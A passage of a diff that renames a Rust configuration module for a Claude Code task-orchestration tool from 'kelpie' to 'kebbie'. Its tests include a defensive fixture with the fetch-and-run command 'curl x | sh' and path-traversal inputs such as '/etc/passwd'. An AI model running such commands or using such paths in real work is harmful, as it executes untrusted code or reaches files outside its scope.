@@ -100,8 +100,8 @@ pub fn permission_mode(name: &str) -> Result<&str> {
         .ok_or(format!("\"{name}\" is not a Claude Code permission mode; use {}", PERMISSION_MODES.map(|mode| format!("\"{mode}\"")).join(", ")))
 }
 
-pub const DEFAULT_SETUP_SKILL: &str = "kelpie:set-up-worktree";
-pub const DEFAULT_RULES_SKILL: &str = "kelpie:work-rules";
+pub const DEFAULT_SETUP_SKILL: &str = "kebbie:set-up-worktree";
+pub const DEFAULT_RULES_SKILL: &str = "kebbie:work-rules";
 pub const DEFAULT_DEV_URL: &str = "http://localhost:{port}";
 pub const DEFAULT_SERVER_NAME: &str = "server";
 pub const DEFAULT_WORKER_NAME: &str = "worker";
@@ -149,7 +149,7 @@ pub struct Machine {
     pub worktree: Worktree,
 }
 
-pub const DEFAULT_HUB_URL: &str = "https://kelpie.gronare.com";
+pub const DEFAULT_HUB_URL: &str = "https://hub.kebbie.dev";
 pub const DEFAULT_REPORT_URL: &str = DEFAULT_HUB_URL;
 pub const INBOX_TOKEN_PREFIX: &str = "kha_";
 
@@ -284,15 +284,15 @@ pub struct Loaded {
 pub fn dir() -> PathBuf {
     std::env::var("XDG_CONFIG_HOME").map(PathBuf::from)
         .unwrap_or_else(|_| PathBuf::from(std::env::var("HOME").unwrap_or_default()).join(".config"))
-        .join("kelpie")
+        .join("kebbie")
 }
 
 pub fn path() -> PathBuf {
-    std::env::var("KELPIE_CONFIG").map(PathBuf::from).unwrap_or_else(|_| dir().join("config.toml"))
+    std::env::var("KEBBIE_CONFIG").map(PathBuf::from).unwrap_or_else(|_| dir().join("config.toml"))
 }
 
 pub fn repos_dir() -> PathBuf {
-    std::env::var("KELPIE_REPOS_DIR").map(PathBuf::from).unwrap_or_else(|_| dir().join("repos"))
+    std::env::var("KEBBIE_REPOS_DIR").map(PathBuf::from).unwrap_or_else(|_| dir().join("repos"))
 }
 
 // A worktree shares its main checkout's file, since the file is named after the main checkout's folder.
@@ -339,7 +339,7 @@ pub fn check_repo(path: &Path) -> Result<(Worktree, Vec<String>)> {
     read(path)?.map_or(Ok((Worktree::default(), Vec::new())), |text| Ok((parse_repo(&text, &source)?, unknown_in_file(&text, &source, &REPO_KEYS))))
 }
 
-pub const UNKNOWN_FIX: &str = "a newer kelpie may know it; kelpie update";
+pub const UNKNOWN_FIX: &str = "a newer kebbie may know it; kebbie update";
 
 static QUIET: std::sync::atomic::AtomicBool = std::sync::atomic::AtomicBool::new(false);
 
@@ -354,7 +354,7 @@ fn warn_once<T>(value: T, unknown: &[String]) -> T {
     }
     let mut warned = WARNED.lock().unwrap_or_else(std::sync::PoisonError::into_inner);
     for line in unknown.iter().filter(|line| !warned.contains(line)).cloned().collect::<Vec<_>>() {
-        eprintln!("kelpie: {line} (ignored: {UNKNOWN_FIX}, or fix the spelling)");
+        eprintln!("kebbie: {line} (ignored: {UNKNOWN_FIX}, or fix the spelling)");
         warned.push(line);
     }
     value
@@ -583,7 +583,7 @@ fn report(table: &Table) -> Result<Report> {
     let text = report.get("text").map(|value| value.as_str().and_then(|given| ReportText::ALL.into_iter().find(|mode| mode.key() == given)).ok_or("report.text: must be \"ask\", \"always\" or \"never\"")).transpose()?;
     let inbox_token = match report.get("inbox_token") {
         None => None,
-        Some(value) => Some(value.as_str().map(str::trim).filter(|token| token.starts_with(INBOX_TOKEN_PREFIX) && token.len() > INBOX_TOKEN_PREFIX.len()).ok_or("report.inbox_token: must be the kha_ token kelpie-hub admin token --name <name> printed")?.to_string()),
+        Some(value) => Some(value.as_str().map(str::trim).filter(|token| token.starts_with(INBOX_TOKEN_PREFIX) && token.len() > INBOX_TOKEN_PREFIX.len()).ok_or("report.inbox_token: must be the kha_ token kebbie-hub admin token --name <name> printed")?.to_string()),
     };
     Ok(Report { url, enabled, signals, text, inbox_token })
 }
@@ -871,7 +871,7 @@ pub fn recover_enabled() -> Result<bool> {
     Ok(load_machine(&path())?.recover.unwrap_or(true))
 }
 
-// The name other machines on the same vault see this kelpie's claims under.
+// The name other machines on the same vault see this kebbie's claims under.
 pub fn machine() -> String {
     load_machine(&path()).ok().and_then(|machine| machine.machine_name).unwrap_or_else(short_hostname)
 }
@@ -884,7 +884,7 @@ pub fn channel() -> Result<Channel> {
     channel_in(&path())
 }
 
-// kelpie update reads only [update] channel, so nothing else in config.toml can keep a machine from updating.
+// kebbie update reads only [update] channel, so nothing else in config.toml can keep a machine from updating.
 pub fn channel_in(path: &Path) -> Result<Channel> {
     let source = path.display().to_string();
     let Some(text) = read(path)? else { return Ok(Channel::default()) };
@@ -935,66 +935,66 @@ pub fn describe(loaded: &Loaded) -> String {
     key("worktree.dev_url", dev_url.value.as_ref().map_or("\"\" (no link)".to_string(), |url| format!("{url:?}")), dev_url.layer,
         "The running dev server's address, shown on the board as a link: {worktree} (the worktree's folder), {repo}, {number} (its pool number) and {port} (its port) are filled in; a worktree without what it names gets no link, and \"\" turns the link off.");
     key("worktree.dev_route", dev_route.value.to_string(), dev_route.layer,
-        "Whether kelpie routes writes a Caddy site for each of this repo's worktrees, at the host its dev_url names, proxied to the worktree's port; for a dev server on a remote machine opened in your laptop's browser. Off unless the repo turns it on; repo config only.");
+        "Whether kebbie routes writes a Caddy site for each of this repo's worktrees, at the host its dev_url names, proxied to the worktree's port; for a dev server on a remote machine opened in your laptop's browser. Off unless the repo turns it on; repo config only.");
     key("worktree.stage_on_main", stage_on_main.value.to_string(), stage_on_main.layer,
-        "Whether kelpie stage may put a ready task's commits on this repo's local default branch, unpushed, so you can try them from the main checkout before you push main; for a repo you run from its main checkout, such as kelpie's own. Off unless the repo turns it on; repo config only.");
+        "Whether kebbie stage may put a ready task's commits on this repo's local default branch, unpushed, so you can try them from the main checkout before you push main; for a repo you run from its main checkout, such as kebbie's own. Off unless the repo turns it on; repo config only.");
     key("worktree.server_name", format!("{:?}", server_name.value), server_name.layer,
         &format!("The name of the tab the board's {server_key} starts the dev server in, and of the Space's tag in herdr's sidebar while it runs; config.toml only."));
     key("worktree.worker_name", format!("{:?}", worker_name.value), worker_name.layer,
         &format!("The same for the worker tab {worker_key} starts; config.toml only."));
     let cleaned: Vec<&str> = clean_on_release.value.iter().map(String::as_str).collect();
     key("worktree.clean_on_release", quoted(&cleaned), clean_on_release.layer,
-        "Build output kelpie removes from a worktree when it goes back to the pool (done, drop, reset, a landed task closing), so the pool's disk use stays bounded; folders inside the worktree, each removed only when git ignores it and tracks nothing in it, and \"target\" only where the worktree has a Cargo.toml. [] keeps everything.");
+        "Build output kebbie removes from a worktree when it goes back to the pool (done, drop, reset, a landed task closing), so the pool's disk use stays bounded; folders inside the worktree, each removed only when git ignores it and tracks nothing in it, and \"target\" only where the worktree has a Cargo.toml. [] keeps everything.");
     key("task.rules_skill", format!("{:?}", rules_skill.value), rules_skill.layer,
         "The skill with the rules for how work is planned, built and committed; a task's Claude follows it, the reviewer checks a ready task against it, tidy reshapes commits by it.");
     let own: Vec<&str> = test_commands.value.iter().map(String::as_str).collect();
     key("task.test_commands", quoted(&own), test_commands.layer,
-        &format!("Test commands of this repo that kelpie records when a task's Claude runs them, on top of the built-in {}; matched on the command's start, after any cd … && and VAR=value. kelpie evidence, the board, the push dialog and the reviewer show the runs.", quoted(&crate::evidence::DEFAULT_COMMANDS)));
+        &format!("Test commands of this repo that kebbie records when a task's Claude runs them, on top of the built-in {}; matched on the command's start, after any cd … && and VAR=value. kebbie evidence, the board, the push dialog and the reviewer show the runs.", quoted(&crate::evidence::DEFAULT_COMMANDS)));
     key("task.also_noticed", format!("{:?}", also_noticed.value.key()), also_noticed.layer,
-        "What a task's Claude does with what it notices outside its task (a bug nearby, a stale doc, a refactor): \"backlog\" files it, in the vault's backlog with the vault plugin, else with kelpie backlog add; \"fix\" fixes a small related one in a commit of its own and files the rest; \"ask\" puts each to you with kelpie ask first. Each is listed under Also noticed on the sign-off card, and the reviewer counts an unrelated change under \"backlog\" or \"ask\" as a finding.");
+        "What a task's Claude does with what it notices outside its task (a bug nearby, a stale doc, a refactor): \"backlog\" files it, in the vault's backlog with the vault plugin, else with kebbie backlog add; \"fix\" fixes a small related one in a commit of its own and files the rest; \"ask\" puts each to you with kebbie ask first. Each is listed under Also noticed on the sign-off card, and the reviewer counts an unrelated change under \"backlog\" or \"ask\" as a finding.");
     key("task.permission_mode", permission_mode.value.as_ref().map_or("none".to_string(), |mode| format!("{mode:?}")), permission_mode.layer,
-        &format!("The permission mode a task's Claude starts in, one of {}; none leaves it to Claude's own default. kelpie start --mode overrides it for one task, and a restarted task keeps the mode it started in. \"bypassPermissions\" runs every tool without asking, for an isolated machine only; a task still never pushes nor approves its own commits.", quoted(&PERMISSION_MODES)));
+        &format!("The permission mode a task's Claude starts in, one of {}; none leaves it to Claude's own default. kebbie start --mode overrides it for one task, and a restarted task keeps the mode it started in. \"bypassPermissions\" runs every tool without asking, for an isolated machine only; a task still never pushes nor approves its own commits.", quoted(&PERMISSION_MODES)));
     key("task.profile", profile.value.as_ref().map_or(format!("none ({:?})", crate::profiles::TASK), |profile| format!("{profile:?}")), profile.layer,
-        &format!("The profile a task starts with when kelpie start names none with --profile: a file in {}/<name>.toml with the agent, model, extra role, skills, permission mode and rules it adds to kelpie's own; none starts the built-in task. A restarted task keeps the profile it started with; kelpie profiles lists them.", crate::profiles::dir().display()));
+        &format!("The profile a task starts with when kebbie start names none with --profile: a file in {}/<name>.toml with the agent, model, extra role, skills, permission mode and rules it adds to kebbie's own; none starts the built-in task. A restarted task keeps the profile it started with; kebbie profiles lists them.", crate::profiles::dir().display()));
     key("task.sandbox", sandbox.value.to_string(), sandbox.layer,
-        &format!("Whether a task's and the reviewer's shell commands run in Claude Code's sandbox: writes only in the worktree, the task's temp folder and {}, network only to {} and a profile's own hosts, no Unix sockets; kelpie's own task commands ({}) run outside it, and kelpie refuses its user-only commands to a sandboxed process. On Linux it needs bubblewrap, socat and the seccomp filter, or kelpie refuses to start tasks; false runs them unsandboxed, where a task can pass as you to kelpie's user-only commands. A profile's [sandbox] enabled wins over it.", crate::sandbox::WRITES.join(", "), crate::sandbox::DOMAINS.join(", "), crate::sandbox::TASK_COMMANDS.join(", ")));
+        &format!("Whether a task's and the reviewer's shell commands run in Claude Code's sandbox: writes only in the worktree, the task's temp folder and {}, network only to {} and a profile's own hosts, no Unix sockets; kebbie's own task commands ({}) run outside it, and kebbie refuses its user-only commands to a sandboxed process. On Linux it needs bubblewrap, socat and the seccomp filter, or kebbie refuses to start tasks; false runs them unsandboxed, where a task can pass as you to kebbie's user-only commands. A profile's [sandbox] enabled wins over it.", crate::sandbox::WRITES.join(", "), crate::sandbox::DOMAINS.join(", "), crate::sandbox::TASK_COMMANDS.join(", ")));
     key("review.model", review_model.value.as_ref().map_or("none".to_string(), |model| format!("{model:?}")), review_model.layer,
-        "The model kelpie review's independent reviewer runs on, ahead of the reviewer profile's model; none leaves it to that profile, then to Claude's default.");
+        "The model kebbie review's independent reviewer runs on, ahead of the reviewer profile's model; none leaves it to that profile, then to Claude's default.");
     key("notify.command", notify_command.value.as_ref().map_or("none".to_string(), |command| format!("{command:?}")), notify_command.layer,
-        "The shell command kelpie runs when something needs you (a task needs you or is ready, a question waits, the lead's summary); KELPIE_EVENT, KELPIE_TASK, KELPIE_REPO and KELPIE_TEXT describe it, and $1 is the text. None sends no notifications; config.toml only.");
+        "The shell command kebbie runs when something needs you (a task needs you or is ready, a question waits, the lead's summary); KEBBIE_EVENT, KEBBIE_TASK, KEBBIE_REPO and KEBBIE_TEXT describe it, and $1 is the text. None sends no notifications; config.toml only.");
     key("vault.command", vault_command.value.as_ref().map_or("none".to_string(), |command| format!("{command:?}")), vault_command.layer,
-        "The notes-vault-mcp command kelpie writes task notes and log lines with, before its own arguments (task open, log append, ...); none runs the vault plugin's own pinned command from its hooks. Used only while the vault plugin is installed and enabled; config.toml only.");
+        "The notes-vault-mcp command kebbie writes task notes and log lines with, before its own arguments (task open, log append, ...); none runs the vault plugin's own pinned command from its hooks. Used only while the vault plugin is installed and enabled; config.toml only.");
     key("ci.watch", ci_watch.value.to_string(), ci_watch.layer,
-        "Whether kelpie watches GitHub Actions after a push and keeps the task open under CI running until every run for the pushed commit is green; a failed run moves the task to Needs you and its Claude gets the failing job's log. Needs origin on GitHub and gh logged in; false closes the task right after the push. A repo config can turn it off for one repo.");
+        "Whether kebbie watches GitHub Actions after a push and keeps the task open under CI running until every run for the pushed commit is green; a failed run moves the task to Needs you and its Claude gets the failing job's log. Needs origin on GitHub and gh logged in; false closes the task right after the push. A repo config can turn it off for one repo.");
     key("docs.required", docs_required.value.to_string(), docs_required.layer,
-        "Whether this repo's docs must keep in step with its code: a task's Claude updates the README and docs/ when its change alters what a user sees or does, by the skill kelpie:keep-docs, and the reviewer fails a branch that changes such behaviour and leaves it undescribed in the README or docs/. Off unless the repo turns it on; repo config only. kelpie doctor suggests it for a public GitHub repo.");
+        "Whether this repo's docs must keep in step with its code: a task's Claude updates the README and docs/ when its change alters what a user sees or does, by the skill kebbie:keep-docs, and the reviewer fails a branch that changes such behaviour and leaves it undescribed in the README or docs/. Off unless the repo turns it on; repo config only. kebbie doctor suggests it for a public GitHub repo.");
     key("update.channel", format!("{:?}", channel.value.key()), channel.layer,
-        "What kelpie update installs on this machine: \"release\", the highest vX.Y.Z tag on origin whose release binary is published; \"main\", origin's default branch as it is pushed. kelpie update --from <branch or path> runs other code until kelpie update --stable; config.toml only.");
+        "What kebbie update installs on this machine: \"release\", the highest vX.Y.Z tag on origin whose release binary is published; \"main\", origin's default branch as it is pushed. kebbie update --from <branch or path> runs other code until kebbie update --stable; config.toml only.");
     key("restart.auto", auto_restart.value.to_string(), auto_restart.layer,
-        "Whether kelpie restarts Claude sessions that run an older Claude Code, plugin, MCP config or kelpie than is installed, each with claude --resume in its own pane, keeping its flags; kelpie update restarts the idle ones at once. false restarts nothing on its own: the board still marks stale sessions, and kelpie restart restarts them when you want; config.toml only.");
+        "Whether kebbie restarts Claude sessions that run an older Claude Code, plugin, MCP config or kebbie than is installed, each with claude --resume in its own pane, keeping its flags; kebbie update restarts the idle ones at once. false restarts nothing on its own: the board still marks stale sessions, and kebbie restart restarts them when you want; config.toml only.");
     key("restart.idle_minutes", idle_minutes.value.to_string(), idle_minutes.layer,
         "How long a stale session waits idle and unfocused before it is restarted; a session mid-turn, the pane you are in and one with background work running are never restarted on their own; config.toml only.");
     key("keeper.enabled", keeper.value.to_string(), keeper.layer,
-        "Whether one background kelpie keeper per machine runs the routines (stale-session restarts, the update check, held messages, delivery checks of typed prompts, scheduled [[routines]]), so they go on with the board closed; herdr's startup, the board and kelpie update start it. false runs them in an open board instead; config.toml only.");
+        "Whether one background kebbie keeper per machine runs the routines (stale-session restarts, the update check, held messages, delivery checks of typed prompts, scheduled [[routines]]), so they go on with the board closed; herdr's startup, the board and kebbie update start it. false runs them in an open board instead; config.toml only.");
     key("recover.enabled", recover.value.to_string(), recover.layer,
-        "Whether kelpie resumes a task whose Claude an API error stopped: after overload, a server error, a rate limit or a dropped connection it says carry on after 1, 2, 4 and 8 minutes; after a usage limit, once the allowance resets. A login, billing, invalid request or refusal error goes to you under Needs you at once. false leaves every such task idle; config.toml only.");
+        "Whether kebbie resumes a task whose Claude an API error stopped: after overload, a server error, a rate limit or a dropped connection it says carry on after 1, 2, 4 and 8 minutes; after a usage limit, once the allowance resets. A login, billing, invalid request or refusal error goes to you under Needs you at once. false leaves every such task idle; config.toml only.");
     key("machine.name", format!("{:?}", machine_name.value), machine_name.layer,
-        "The machine's one name: your phone shows it through the hub, and kelpie claims vault notes under it; kelpie hub connect and kelpie hub join use it, set it from --name or ask for it when unset. A task started from a vault note writes it with the task's name into the note's kelpie frontmatter key, and kelpie on another machine sharing the vault shows the note as worked on at this name and asks before starting it; the default is the host's short name. config.toml only.");
+        "The machine's one name: your phone shows it through the hub, and kebbie claims vault notes under it; kebbie hub connect and kebbie hub join use it, set it from --name or ask for it when unset. A task started from a vault note writes it with the task's name into the note's kebbie frontmatter key, and kebbie on another machine sharing the vault shows the note as worked on at this name and asks before starting it; the default is the host's short name. config.toml only.");
     key("hub.url", format!("{:?}", hub_url.value), hub_url.layer,
-        "The hub kelpie hub connect and the board's hub window connect this machine to: the kelpie hub unless set, or your own kelpie hub at an https address (http only on this machine). Choosing your own hub there sets it; the hub a machine is connected to stays in kelpie's state with its keys, so changing this key later moves nothing (kelpie hub move does). config.toml only.");
+        "The hub kebbie hub connect and the board's hub window connect this machine to: the kebbie hub unless set, or your own kebbie hub at an https address (http only on this machine). Choosing your own hub there sets it; the hub a machine is connected to stays in kebbie's state with its keys, so changing this key later moves nothing (kebbie hub move does). config.toml only.");
     key("report.signals", report_signals.value.to_string(), report_signals.layer,
-        "Whether kelpie sends its maintainers error signals, counts of kelpie's own failures: when kelpie itself fails (a panic, and some internal errors), the keeper sends at most once a day a count per failure with only kelpie's version and commit, the OS and CPU architecture, the component (a fixed name from kelpie's code, such as keeper.push) and the error kind (panic, internal-error, corrupt-state). Never an error message, path, repo, task or host name. Each send is a line under messages on the board; false sends none and drops what was counted; config.toml only.");
+        "Whether kebbie sends its maintainers error signals, counts of kebbie's own failures: when kebbie itself fails (a panic, and some internal errors), the keeper sends at most once a day a count per failure with only kebbie's version and commit, the OS and CPU architecture, the component (a fixed name from kebbie's code, such as keeper.push) and the error kind (panic, internal-error, corrupt-state). Never an error message, path, repo, task or host name. Each send is a line under messages on the board; false sends none and drops what was counted; config.toml only.");
     key("report.text", format!("{:?}", report_text.value.key()), report_text.layer,
-        "What happens to a bug in kelpie you ran into, once you or the lead saved it, with its text redacted (paths under your home as ~, no repo names, remote URLs or tokens): \"ask\" shows it on the board as it would go to kelpie's maintainers and only your yes sends it; \"always\" sends it without asking, and says so under messages, once you arm it with kelpie issue report --always in your own terminal (until then it asks); \"never\" keeps it on this machine, though kelpie issue report <id> still sends one when you ask. Signed with this install's key; config.toml only.");
+        "What happens to a bug in kebbie you ran into, once you or the lead saved it, with its text redacted (paths under your home as ~, no repo names, remote URLs or tokens): \"ask\" shows it on the board as it would go to kebbie's maintainers and only your yes sends it; \"always\" sends it without asking, and says so under messages, once you arm it with kebbie issue report --always in your own terminal (until then it asks); \"never\" keeps it on this machine, though kebbie issue report <id> still sends one when you ask. Signed with this install's key; config.toml only.");
     key("report.url", format!("{:?}", report_url.value), report_url.layer,
-        "Where reports go: the project's reports endpoint, unless you run your own kelpie hub for them; config.toml only.");
+        "Where reports go: the project's reports endpoint, unless you run your own kebbie hub for them; config.toml only.");
     key("report.inbox_token", if report_inbox.value { "set".to_string() } else { "none".to_string() }, report_inbox.layer,
-        "For kelpie's maintainers: the token kelpie-hub admin token --name <name> minted. With it the keeper fetches the reports the hub lets through every 10 minutes, files each as a kelpie issue and acknowledges it, and kelpie doctor counts the ones waiting in quarantine; never in a repo config, and never shown.");
+        "For kebbie's maintainers: the token kebbie-hub admin token --name <name> minted. With it the keeper fetches the reports the hub lets through every 10 minutes, files each as a kebbie issue and acknowledges it, and kebbie doctor counts the ones waiting in quarantine; never in a repo config, and never shown.");
     key("issues.propose", propose_issues.value.to_string(), propose_issues.layer,
-        "Whether the lead proposes saving a bug or wish about kelpie when kelpie itself cost something (an error, a workaround, a missing capability), one per turn at most, and saves it on your yes; false keeps the lead from proposing or filing them, and it files one only when you ask it to. Takes effect when the lead next restarts (L on the board); config.toml only.");
+        "Whether the lead proposes saving a bug or wish about kebbie when kebbie itself cost something (an error, a workaround, a missing capability), one per turn at most, and saves it on your yes; false keeps the lead from proposing or filing them, and it files one only when you ask it to. Takes effect when the lead next restarts (L on the board); config.toml only.");
     lines.push("[keys]  (config.toml only)\n  The board's keys, as name = \"key\" by action: a plain character for an action whose key is one (esc, ctrl+c, ⏎, the arrows and tab stay), and one not taken by another action where both act; moving two at once in the table works. An entry that breaks a rule is ignored, and named below. Help, hints and messages show the key in effect.".to_string());
     lines.extend(board_keys.describe(&key_errors).into_iter().map(|line| format!("  {line}")));
-    lines.push(format!("[[routines]]  (config.toml or a repo config)\n  Checks kelpie runs on a schedule, each as a task that reports, plans or fixes, one table each with the keys {}; a repo config's run in its repo, one in config.toml names its repo. Listed below are config.toml's and this repo's; kelpie routines lists every one with its next run, and docs/reference/configuration.md shows each key.", crate::routines::KEYS.join(", ")));
+    lines.push(format!("[[routines]]  (config.toml or a repo config)\n  Checks kebbie runs on a schedule, each as a task that reports, plans or fixes, one table each with the keys {}; a repo config's run in its repo, one in config.toml names its repo. Listed below are config.toml's and this repo's; kebbie routines lists every one with its next run, and docs/reference/configuration.md shows each key.", crate::routines::KEYS.join(", ")));
     let repo_file = loaded.repo.clone().map(|file| { let stem = file.file_stem().map(|stem| stem.to_string_lossy().to_string()); (file, stem) });
     let (routines, errors) = crate::routines::load_files([(loaded.machine.clone(), None)].into_iter().chain(repo_file).collect());
     lines.extend(routines.iter().map(|routine| format!("  {}: {} in {}, {}{}", routine.id, routine.schedule.text(), routine.repo, routine.mode.key(), if routine.enabled { "" } else { ", off" })));
@@ -1009,7 +1009,7 @@ pub fn get(key: &str) -> Result<String> {
     match key {
         "worktree.server_name" => Ok(settings.server_name.value),
         "worktree.worker_name" => Ok(settings.worker_name.value),
-        other => Err(format!("kelpie config --get knows worktree.server_name and worktree.worker_name, not {other}")),
+        other => Err(format!("kebbie config --get knows worktree.server_name and worktree.worker_name, not {other}")),
     }
 }
 
@@ -1030,7 +1030,7 @@ mod tests {
     use super::*;
 
     #[test]
-    fn keys_live_in_config_toml_only_and_kelpie_config_shows_each_with_why_an_entry_was_ignored() {
+    fn keys_live_in_config_toml_only_and_kebbie_config_shows_each_with_why_an_entry_was_ignored() {
         let config = machine("[keys]\ninbox = \"I\"\nchat = \"p\"\nback = \"x\"\nnew = 3\n");
         assert_eq!(config.keys, [("back".to_string(), "x".to_string()), ("chat".to_string(), "p".to_string()), ("inbox".to_string(), "I".to_string()), ("new".to_string(), "integer value".to_string())]);
         let refused = parse_repo("[keys]\ninbox = \"I\"\n", "app.toml").unwrap_err();
@@ -1046,13 +1046,13 @@ mod tests {
     }
 
     #[test]
-    fn kelpie_config_describes_the_routines_and_lists_config_tomls_and_the_repos() {
+    fn kebbie_config_describes_the_routines_and_lists_config_tomls_and_the_repos() {
         let dir = crate::sh::test_dir("config-routines");
         let (file, repo) = (dir.join("config.toml"), dir.join("app.toml"));
         std::fs::write(&file, "[[routines]]\nid = \"disk\"\ntitle = \"Disk\"\nrepo = \"~/code/infra\"\nat = \"07:00\"\nprompt = \"p\"\n").unwrap();
         std::fs::write(&repo, "[[routines]]\nid = \"deps\"\ntitle = \"Updates\"\nat = \"mon 07:00\"\nprompt = \"p\"\nmode = \"plan\"\nenabled = false\n").unwrap();
         let shown = describe(&Loaded { machine: file, repo: Some(repo), settings: settings(&Worktree::default(), &Machine::default()) });
-        assert!(shown.contains("[[routines]]  (config.toml or a repo config)\n  Checks kelpie runs on a schedule") && shown.contains("with the keys id, title, repo, every, at, prompt, mode, push, enabled"), "{shown}");
+        assert!(shown.contains("[[routines]]  (config.toml or a repo config)\n  Checks kebbie runs on a schedule") && shown.contains("with the keys id, title, repo, every, at, prompt, mode, push, enabled"), "{shown}");
         assert!(shown.contains("\n  disk: daily at 07:00 in ~/code/infra, report\n  deps: mon at 07:00 in app, plan, off\n"), "{shown}");
         let _ = std::fs::remove_dir_all(dir);
     }
@@ -1086,13 +1086,13 @@ mod tests {
         for bad in ["", "../x.toml", "a/../../x", "/etc/passwd", "a/.."] {
             assert!(!inside(bad), "{bad}");
         }
-        for good in ["work-rules", "kelpie:work-rules", "my-tools:set-up-worktree"] {
+        for good in ["work-rules", "kebbie:work-rules", "my-tools:set-up-worktree"] {
             assert!(skill_name(good), "{good}");
         }
-        for bad in ["..", "kelpie:..", "kelpie:../../outside", "../../outside", "a/b", "/abs", "x:", ":x", "a:b:c", "a\\b"] {
+        for bad in ["..", "kebbie:..", "kebbie:../../outside", "../../outside", "a/b", "/abs", "x:", ":x", "a:b:c", "a\\b"] {
             assert!(!skill_name(bad), "{bad}");
         }
-        let refused = parse_repo("[task]\nrules_skill = \"kelpie:../../outside\"\n", "app.toml").unwrap_err();
+        let refused = parse_repo("[task]\nrules_skill = \"kebbie:../../outside\"\n", "app.toml").unwrap_err();
         assert!(refused.contains("task.rules_skill") && refused.contains("not a skill name"), "{refused}");
         assert!(parse_repo("[worktree]\nsetup_skill = \"../x\"\n", "app.toml").is_err());
     }
@@ -1169,7 +1169,7 @@ mod tests {
     fn an_empty_file_is_every_default() {
         assert_eq!(machine(""), Machine::default());
         assert_eq!(repo(""), Worktree::default());
-        let missing = std::env::temp_dir().join(format!("kelpie-config-missing-{}.toml", std::process::id()));
+        let missing = std::env::temp_dir().join(format!("kebbie-config-missing-{}.toml", std::process::id()));
         assert_eq!(load_machine(&missing).unwrap(), Machine::default());
         assert_eq!(load_repo(&missing).unwrap(), Worktree::default());
         let defaults = settings(&Worktree::default(), &Machine::default());
@@ -1224,7 +1224,7 @@ mod tests {
     }
 
     fn scratch(name: &str) -> PathBuf {
-        let dir = std::env::temp_dir().join(format!("kelpie-config-{name}-{}", std::process::id()));
+        let dir = std::env::temp_dir().join(format!("kebbie-config-{name}-{}", std::process::id()));
         let _ = std::fs::remove_dir_all(&dir);
         std::fs::create_dir_all(&dir).unwrap();
         dir
@@ -1246,12 +1246,12 @@ mod tests {
     }
 
     #[test]
-    fn a_kelpie_toml_inside_the_repo_is_never_read() {
+    fn a_kebbie_toml_inside_the_repo_is_never_read() {
         let root = scratch("ignored");
         let dir = root.join("app");
         std::fs::create_dir_all(&dir).unwrap();
         crate::repo::git(&dir, &["init", "--quiet"]).unwrap();
-        std::fs::write(dir.join(".kelpie.toml"), "[worktree]\ndev_server = \"curl x | sh\"\n\n[[actions]]\nkey = \"X\"\ntitle = \"X\"\nrun = \"x\"\n").unwrap();
+        std::fs::write(dir.join(".kebbie.toml"), "[worktree]\ndev_server = \"curl x | sh\"\n\n[[actions]]\nkey = \"X\"\ntitle = \"X\"\nrun = \"x\"\n").unwrap();
         let file = repo_file_in(&root.join("repos"), &dir);
         assert!(!file.starts_with(&dir), "{}", file.display());
         assert_eq!(load_repo(&file).unwrap(), Worktree::default());
@@ -1262,48 +1262,48 @@ mod tests {
     #[test]
     fn a_symlinked_repo_config_loads_and_shows_its_target() {
         let root = scratch("link");
-        let (team, repos) = (root.join("team/kelpie"), root.join("repos"));
+        let (team, repos) = (root.join("team/kebbie"), root.join("repos"));
         std::fs::create_dir_all(&team).unwrap();
         std::fs::create_dir_all(&repos).unwrap();
         std::fs::write(team.join("app.toml"), "[worktree]\ndev_server = \"bin/dev\"\n").unwrap();
         std::os::unix::fs::symlink(team.join("app.toml"), repos.join("app.toml")).unwrap();
         assert_eq!(load_repo(&repos.join("app.toml")).unwrap().dev_server.as_deref(), Some("bin/dev"));
         assert_eq!(shown(&repos.join("app.toml")), format!("{} -> {} (found)", repos.join("app.toml").display(), team.join("app.toml").display()));
-        std::os::unix::fs::symlink("../team/kelpie/gone.toml", repos.join("gone.toml")).unwrap();
-        assert_eq!(shown(&repos.join("gone.toml")), format!("{} -> {} (not found)", repos.join("gone.toml").display(), repos.join("../team/kelpie/gone.toml").display()));
+        std::os::unix::fs::symlink("../team/kebbie/gone.toml", repos.join("gone.toml")).unwrap();
+        assert_eq!(shown(&repos.join("gone.toml")), format!("{} -> {} (not found)", repos.join("gone.toml").display(), repos.join("../team/kebbie/gone.toml").display()));
         assert_eq!(shown(&repos.join("none.toml")), format!("{} (not found)", repos.join("none.toml").display()));
         std::fs::remove_dir_all(root).unwrap();
     }
 
     #[test]
     fn unknown_keys_are_named_with_the_file_and_ignored_while_bad_values_still_fail() {
-        let warned = |text: &str| unknown_in_file(text, "/home/u/.config/kelpie/config.toml", &MACHINE_KEYS);
+        let warned = |text: &str| unknown_in_file(text, "/home/u/.config/kebbie/config.toml", &MACHINE_KEYS);
         let all = "board, worktree, task, review, notify, vault, update, restart, keeper, recover, machine, hub, keys, ci, routines, report, issues";
         assert_eq!(warned("colour = 1
-"), [format!("/home/u/.config/kelpie/config.toml: colour: unknown key; known keys here: {all}")]);
-        assert_eq!(warned("[backlog]\nsources = []\n"), [format!("/home/u/.config/kelpie/config.toml: backlog: unknown key; known keys here: {all}")]);
-        assert_eq!(warned("[board.backlog]\nsource = []\n"), ["/home/u/.config/kelpie/config.toml: board.backlog.source: unknown key; known keys here: sources, ongoing"]);
+"), [format!("/home/u/.config/kebbie/config.toml: colour: unknown key; known keys here: {all}")]);
+        assert_eq!(warned("[backlog]\nsources = []\n"), [format!("/home/u/.config/kebbie/config.toml: backlog: unknown key; known keys here: {all}")]);
+        assert_eq!(warned("[board.backlog]\nsource = []\n"), ["/home/u/.config/kebbie/config.toml: board.backlog.source: unknown key; known keys here: sources, ongoing"]);
         assert_eq!(machine("colour = 1\n[backlog]\nsources = []\n[board]\ncolumns = 3\n[board.backlog]\nsource = []\n"), Machine::default(), "unknown keys and tables are ignored");
-        let error = |text: &str| parse_machine(text, "/home/u/.config/kelpie/config.toml").unwrap_err();
-        assert_eq!(error("colour = 1\n[board.backlog]\nsources = [\"jira\"]\n"), "/home/u/.config/kelpie/config.toml: board.backlog.sources: \"jira\" is not a source; use \"local\", \"vault\" or \"linear\"");
+        let error = |text: &str| parse_machine(text, "/home/u/.config/kebbie/config.toml").unwrap_err();
+        assert_eq!(error("colour = 1\n[board.backlog]\nsources = [\"jira\"]\n"), "/home/u/.config/kebbie/config.toml: board.backlog.sources: \"jira\" is not a source; use \"local\", \"vault\" or \"linear\"");
         assert!(error("[board.backlog]\nsources = \"vault\"\n").contains("board.backlog.sources: must be a list of strings"));
